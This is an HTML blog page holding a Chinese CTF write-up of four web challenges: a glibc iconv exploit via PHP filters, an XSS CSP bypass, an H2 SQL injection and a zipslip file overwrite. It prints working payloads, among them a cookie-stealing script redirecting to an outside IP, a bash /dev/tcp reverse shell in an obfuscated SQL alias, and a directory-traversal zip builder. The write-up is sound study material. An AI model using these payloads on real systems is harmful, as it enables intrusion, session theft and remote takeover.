@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="# n1junior  # Gavatar  iconv：是php的内置函数，将字符串转换为请求的字符编码，iconv（） 是一个国际标准转换应用程序命令行编程接口，它利用 Unicode 转换将各种字符编码转换为其他编码类型。  在GNU C库，也就是glibc中，iconv()函数2.39及以前存在一处缓冲区溢出漏洞，iconv函数在将字符串转换为ISO-2022-CN-EXT 字符集式，可">
+<meta property="og:type" content="article">
+<meta property="og:title" content="n1junior">
+<meta property="og:url" content="http://example.com/2026/09/16/04-n1junior/index.html">
+<meta property="og:site_name" content="Glut4micum">
+<meta property="og:description" content="# n1junior  # Gavatar  iconv：是php的内置函数，将字符串转换为请求的字符编码，iconv（） 是一个国际标准转换应用程序命令行编程接口，它利用 Unicode 转换将各种字符编码转换为其他编码类型。  在GNU C库，也就是glibc中，iconv()函数2.39及以前存在一处缓冲区溢出漏洞，iconv函数在将字符串转换为ISO-2022-CN-EXT 字符集式，可">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-09-16T13:58:01.000Z">
+<meta property="article:modified_time" content="2026-09-16T13:58:01.000Z">
+<meta property="article:author" content="谷氨酸棒状杆菌">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2026/09/16/04-n1junior/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>n1junior | Glut4micum</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Glut4micum</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/09/16/04-n1junior/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://ice.frostsky.com/2024/03/16/1776051b6463e644bf0eb40aed808727.md.jpeg">
+      <meta itemprop="name" content="谷氨酸棒状杆菌">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Glut4micum">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          n1junior
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-09-16 21:58:01" itemprop="dateCreated datePublished" datetime="2026-09-16T21:58:01+08:00">2026-09-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">知识笔记</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="本文总阅读两 fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        
+# n1junior
+
+# Gavatar
+
+iconv：是php的内置函数，将字符串转换为请求的字符编码，iconv（） 是一个国际标准转换应用程序命令行编程接口，它利用 Unicode 转换将各种字符编码转换为其他编码类型。
+
+在GNU C库，也就是glibc中，iconv()函数2.39及以前存在一处缓冲区溢出漏洞，iconv函数在将字符串转换为ISO-2022-CN-EXT 字符集式，可能回事传递给他的输出缓冲区溢出最多4个字节，可能会导致应用程序崩溃或覆盖相邻变量，`convert.iconv.X.Y` 的过滤器也是将字符集从 X 转换为 Y，在linux上他的底层就是使用了glibc的iconv，
+
+## vulhub靶场实践
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/ff9987b1-image.png)
+
+通过post传参file就可以任意文件读取
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/caafb786-image.png)
+
+使用工具php-filter-iconv-main，我们需要读取两个文件/proc/self/maps和libc-2.x.so，我们通过前一个文件就可以知道是libc.s0.6
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/64c2f781-image.png)
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/ac7d2357-image.png)
+
+使用的是原作者给出的exploit
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">需要安装的依赖</span><br><span class="line">pip install pwntools</span><br><span class="line">pip install https:<span class="comment">//github.com/cfreal/ten/archive/refs/heads/main.zip</span></span><br><span class="line"></span><br><span class="line">然后下载poc</span><br><span class="line">wget https:<span class="comment">//raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py</span></span><br><span class="line">python cnext-exploit.py http:<span class="comment">//198.23.148.51:8080/index.php &quot;echo &#x27;&lt;?=phpinfo();?&gt;&#x27; &gt; shell.php&quot;</span></span><br><span class="line"><span class="comment">//代码执行有版本要求，使用的python语法要求版本大于3.10</span></span><br></pre></td></tr></table></figure>
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/420db5d8-image.png)
+
+访问后可以看到我们成功rce了
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/e82ed7a9-image.png)
+
+## 本地
+
+本地环境搭建
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/f3fdf4d2-image.png)
+
+注册用户进入profile页面
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/e1690c25-image.png)
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/7d603f7f-image.png)
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/6049f0c3-image.png)根据源码给upload传参，可以看到头像变成了透明的
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/be6dfe4d-image.png)
+
+在新标签页打开，就可以看到输出的内容
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/98024624-image.png)
+
+也就印证了存在我们所知的漏洞能够进行任意文件读取
+
+使用的工具：[https://github.com/kezibei/php-filter-iconv](https://github.com/kezibei/php-filter-iconv)
+
+由于需要读取的是/proc/self/maps和libc-2.x.so文件，所以我们用filter过滤器保证文件读出来的完整性
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/dd6929e4-image.png)
+
+内容太大用代码解码
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="type">php</span></span><br><span class="line"><span class="variable">$encoded_data</span> <span class="operator">=</span> <span class="string">&quot; &quot;</span>; </span><br><span class="line"></span><br><span class="line">$decoded_data = base64_decode($encoded_data);</span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">&#x27;libc.so.6&#x27;</span>, $decoded_data);</span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;数据已保存到 libc.so.6 文件中&quot;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/cdac2276-image.png)
+
+运行文件就会输出payload
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/92c8aaca-image.png)
+
+访问1.php我们就会发现文件已经被写入了
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/92361a2b-image.png)成功rce
+
+# display
+
+`docker run -d -p 3000:3000 display`
+
+自我反思docker用得烂烂的，不知道为什么拉不下来，最后一直在改镜像源，我归结为学校里面的破烂网
+
+> 补充一个之前一直没有注意到的细节， 容器内的服务会监听特定的端口，这个时候就不能是80，要根据运行的服务进行改动，不然打不开，搭容器给我卡疯了，破口大骂，离谱到前面都拉下来了RUN npm install搁那一直加载
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/ac58399f-image.png)
+
+见到它真的太不容易了X﹏X
+
+## xss同源策略绕过，innerHtml\inerText
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/3208f165-image.png)
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/632a0946-image.png)
+
+也就是达到下面这个效果，同时可以看到flag，在cookie里面
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/8d40eeac-image.png)
+
+这个是漏洞点，我们能够进行xss
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/85f4ef34-image.png)
+
+其中sanitize是用于富文本防止xss攻击的一种安全过滤手段，能对script标签等进行过滤，白名单只允许h1和h2标签
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/2bc3e5b4-image.png)
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/2f252d64-image.png)这一段代码存在逻辑问题，也就是我们可以利用的漏洞点
+
+`innerText`：这个属性主要用于获取或设置元素内部文本内容，不包括HTML标签，只返回纯文本, 如果 HTML 内容包含 `<`、`>` 等字符（例如 `<div>`），这些字符会被当作普通文本处理，而不是 HTML 元素 。
+
+`innerHtml`： 获取或设置元素的 HTML 内容，包括 HTML 标签， 如果你将 HTML 编码后的内容赋给 `innerHTML`，它会被自动解析为 HTML 元素（例如 `<div>` 会变成一个 `div` 标签）。
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/1c28171d-image.png)
+
+所以当我们给一个HTML编码后的东西，就会被解析为HTML代码，实现绕过。
+
+innerHtml里面的标签在插入后不会立即执行script标签，二十需要刷新一次，但是刷新后我们写入的内容又会失效，因此我们需要利用iframe标签
+
+`iframe`：用于在网页内嵌另一个网页
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/fb3ac51f-image.png)
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/a2fa8ac8-image.png)
+
+运行后发现控制台弹出错误，继续去看源码
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/1d90cdd7-image.png)
+
+## 什么是CSP
+
+CSP是一种网络安全机制，旨在减少或消除跨站脚本（XSS）和数据注入攻击
+
+CSP的工作原理是通过浏览器读取网页服务器发送的Content-Security-Policy HTTP 头文件，然后根据其中的规则来决定是否允许加载某个资源。
+
+​
+
+CSP的规则主要包括：
+
+​
+
+默认源（default-src）：指定默认的资源加载源，除非其他规则覆盖。
+
+脚本源（script-src）：控制可以加载和执行的 JavaScript 资源。
+
+样式源（style-src）：控制可以加载的 CSS 资源。
+
+图片源（img-src）：控制可以加载的图像资源。
+
+字体源（font-src）：控制可以加载的字体资源。
+
+连接源（connect-src）：控制可以发起的网络请求（例如 AJAX 请求）。
+
+媒体源（media-src）：控制可以加载的视频和音频资源。
+
+框架源（frame-src）：控制嵌入的 iframe 来源。
+
+这些规则允许网站管理员细致地控制网页内容的来源，避免一些不受信任或恶意的外部资源被加载，从而提升网站的安全性。
+
+[引用连接](https://blog.csdn.net/weixin_63726940/article/details/144934943)
+
+简单来说就是仅允许同源加载
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/12361041-image.png)
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/1e0333a3-image.png)
+
+成功进行了弹窗，我们需要拿的东西在cookie里面尝试一下
+
+`<iframe srcdoc = "<script src='http://localhost:3000//%0Aalert(document.cookie)%0A//'></script>"></iframe>`
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/1a059db0-image.png)
+
+我这边也是直接拿到了，但是案例来说是iframe标签页的cookie，所以应该是`windows.parent.document.cookie`
+
+cookie外带
+
+`http://localhost:3000/?text=&lt;iframe srcdoc='&lt;script src=&quot;http://localhost:3000//%0Awindow.location.href=\`http://198.23.148.51/\`+window.parent.document.cookie%0A//&quot;&gt;&lt;/script&gt;'&gt;&lt;/iframe&gt;`base64编码即可
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/0c9e3847-image.png)
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/2aa07a35-image.png)
+
+`python3 -m http.server 80`卡时间没出来就没试了
+
+# easydb
+
+`docker run -d -p 8000:8000 easydb`
+
+Java h2 SQL rce
+
+运行`jar xf EasyDB.jar`得到BOOT-INF
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/e9924318-image.png)
+
+UserController是一个登录路由，登录的逻辑在UserService.validateUser
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/b0518780-image.png)在UserService.validateUser里可以看到username和password可控，由此就可以知道是SQL注入,然后还有一个SecurityUtils.check的过滤，ban掉了常用的一些东西
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/d65f046f-image.png)
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CREATE ALIAS aa AS <span class="string">&#x27;String fun() throws Exception&#123; //创建一个名为 aa 的别名</span></span><br><span class="line"><span class="string">    String[] cmds = new String[]&#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/198.23.148.51/777 &lt;&amp;1&quot;&#125;;</span></span><br><span class="line"><span class="string">    //动态加载 java.lang.Runtime 类，这使得后续可以通过反射调用 Runtime 类的 getRuntime() 方法</span></span><br><span class="line"><span class="string">    Class clazz = Class.forName(&quot;java.lang.Runt&quot; + &quot;ime&quot;); </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    //invoke() 方法用于在运行时通过反射调用一个方法。这里调用的是 Runtime.getRuntime() 方法</span></span><br><span class="line"><span class="string">    Object run = clazz.getMethod(&quot;getRunt&quot; + &quot;ime&quot;).invoke(null); </span></span><br><span class="line"><span class="string">    clazz.getDeclaredMethod(&quot;ex&quot; + &quot;ec&quot;, String[].class).invoke(run, (Object) cmds); </span></span><br><span class="line"><span class="string">    return &quot;ok&quot;; </span></span><br><span class="line"><span class="string">&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+`clazz.getMethod("getRunt" + "ime")` 通过反射机制获取 `Runtime` 类中的 `getRuntime()` 方法。
+
+`clazz.getMethod()` 接受一个方法名（`"getRuntime"`）作为参数，返回一个 `Method` 对象。通过这个 `Method` 对象，可以调用对应的方法。
+
+`getDeclaredMethod()` 是 `Class` 类提供的一个方法，用来获取一个类的指定方法。这个方法可以获取类中**所有**的方法（包括私有方法）
+
+payload:`1';CREATE ALIAS aa AS 'String fun() throws Exception{ String[] cmds = new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/198.23.148.51/777 <&1"}; Class clazz = Class.forName("java.lang.Runt" + "ime"); Object run = clazz.getMethod("getRunt" + "ime").invoke(null); clazz.getDeclaredMethod("ex" + "ec", String[].class).invoke(run, (Object) cmds); return "ok"; }';CALL aa();--+`
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/ebbb0474-image.png)
+
+成功反弹shell，进行rce即可，flag本身为空，所以没有内容。
+
+# traefik
+
+容器创建好后直接访问，会发现是404，通过查看traefik.yml文件,可以发现traefik做了代理`providers.file` 使得服务是通过读取 `/app/.config/dynamic.yml` 文件来动态加载配置 ,只允许 `/public/index`和`/public/upload` 的访问
+
+而我们去查看dynamic.yml可以发现文件时动态生成的，可以考虑进行文件覆盖，实现访问/flag
+
+main.go文件
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/adfdf21a-image.png)
+
+这里提供了一个解压功能，是典型的zipslip
+
+构造恶意zip包实现目录穿越和文件覆盖
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        zipFile = zipfile.ZipFile(<span class="string">&quot;text.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)  </span><br><span class="line">        info = zipfile.ZipInfo(<span class="string">&quot;text.zip&quot;</span>)  </span><br><span class="line">        zipFile.write(<span class="string">&quot;D://desktop/EasyDB-attachment/dynamic.yml&quot;</span>, <span class="string">&quot;../../../../../../..//app/.config/dynamic.yml&quot;</span>, zipfile.ZIP_DEFLATED)  </span><br><span class="line">        zipFile.close()  </span><br><span class="line">    except IOError as e:  </span><br><span class="line">        raise e</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># Dynamic configuration</span><br><span class="line"></span><br><span class="line">http:</span><br><span class="line">  services:</span><br><span class="line">    proxy:</span><br><span class="line">      loadBalancer:</span><br><span class="line">        servers:</span><br><span class="line">          - url: <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">  middlewares:</span><br><span class="line">    add-x-forwarded-<span class="keyword">for</span>:</span><br><span class="line">      headers:</span><br><span class="line">        customRequestHeaders:</span><br><span class="line">          X-Forwarded-For: <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">  routers:</span><br><span class="line">    index:</span><br><span class="line">      rule: Path(`/<span class="keyword">public</span>/index`)</span><br><span class="line">      entrypoints: [web]</span><br><span class="line">      service: proxy</span><br><span class="line">    upload:</span><br><span class="line">      rule: Path(`/<span class="keyword">public</span>/upload`)</span><br><span class="line">      entrypoints: [web]</span><br><span class="line">      service: proxy</span><br><span class="line">    flag:</span><br><span class="line">      rule: Path(`/flag`)</span><br><span class="line">      entrypoints: [web]</span><br><span class="line">      service: proxy</span><br><span class="line">      middlewares:</span><br><span class="line">        - add-x-forwarded-<span class="keyword">for</span></span><br></pre></td></tr></table></figure>
+
+运行代码得到一个压缩包，访问/public/index，然后将压缩包上传后就实现了文件覆盖，直接访问/flag即可得到flag
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/b4ed95c9-image.png)
+
+![image.png](/yuque-notes/02-Knowledge Book/assets/8c24b19a-image.png)
+
+后台也可以看到成功覆盖了
+
+​
+
+---
+
+来源: https://www.yuque.com/guansuanbangzhuangganjun/oxmbxg/gq4l6msrrc9sh7ql
+语雀文档ID: 207538752
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"># 学习笔记</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/09/16/03-gobuster/" rel="prev" title="gobuster">
+      <i class="fa fa-chevron-left"></i> gobuster
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2026/09/16/05-hgame/" rel="next" title="hgame">
+      hgame <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="谷氨酸棒状杆菌"
+      src="https://ice.frostsky.com/2024/03/16/1776051b6463e644bf0eb40aed808727.md.jpeg">
+  <p class="site-author-name" itemprop="name">谷氨酸棒状杆菌</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">72</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Glut4micum" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Glut4micum" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">谷氨酸棒状杆菌</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div> -->
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="总访客量 fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="总阅读量 fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
